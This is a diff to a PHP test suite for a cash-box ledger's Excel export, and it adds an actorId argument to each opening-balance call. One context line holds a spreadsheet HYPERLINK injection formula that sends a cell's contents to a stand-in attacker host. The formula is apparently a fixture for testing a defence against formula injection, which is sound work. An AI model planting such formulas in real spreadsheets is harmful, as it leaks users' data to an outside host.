@@ -276,6 +276,7 @@ class PlanillaDeCajaExcelTest extends TestCase
     public function test_el_reverso_identifica_un_cheque_cargado_en_la_apertura(): void
     {
         app(RegisterOpeningBalance::class)->handle(
+            actorId: $this->quienAbre(),
             cashBoxId: $this->caja(),
             balances: [
                 LedgerAccount::CashOnHand->value => '6852300.00',
@@ -344,6 +345,7 @@ class PlanillaDeCajaExcelTest extends TestCase
         $formula = '=HYPERLINK("https://atacante.example/?d="&H1,"Ver detalle")';
 
         app(RegisterOpeningBalance::class)->handle(
+            actorId: $this->quienAbre(),
             cashBoxId: $this->caja(),
             balances: [
                 LedgerAccount::CashOnHand->value => '6852300.00',
@@ -391,6 +393,7 @@ class PlanillaDeCajaExcelTest extends TestCase
         $this->expectExceptionMessage('Tienen que coincidir');
 
         app(RegisterOpeningBalance::class)->handle(
+            actorId: $this->quienAbre(),
             cashBoxId: $this->caja(),
             balances: [
                 LedgerAccount::CashOnHand->value => '6852300.00',
@@ -637,6 +640,7 @@ class PlanillaDeCajaExcelTest extends TestCase
     private function abrirLibros(string $fecha = '2026-06-01'): void
     {
         app(RegisterOpeningBalance::class)->handle(
+            actorId: $this->quienAbre(),
             cashBoxId: $this->caja(),
             balances: [
                 LedgerAccount::CashOnHand->value => '6852300.00',
@@ -665,6 +669,7 @@ class PlanillaDeCajaExcelTest extends TestCase
     private function cierreDel30DeJunioConArqueo(): PeriodClosing
     {
         app(RegisterOpeningBalance::class)->handle(
+            actorId: $this->quienAbre(),
             cashBoxId: $this->caja(),
             balances: [LedgerAccount::CashOnHand->value => '743050.00'],
             denominations: $this->billetesPara('743050.00'),
@@ -695,6 +700,7 @@ class PlanillaDeCajaExcelTest extends TestCase
     private function cierreDel30DeJunioConFajoRecontado(): PeriodClosing
     {
         app(RegisterOpeningBalance::class)->handle(
+            actorId: $this->quienAbre(),
             cashBoxId: $this->caja(),
             balances: [LedgerAccount::CashOnHand->value => '743050.00'],
             denominations: $this->billetesPara('743050.00'),
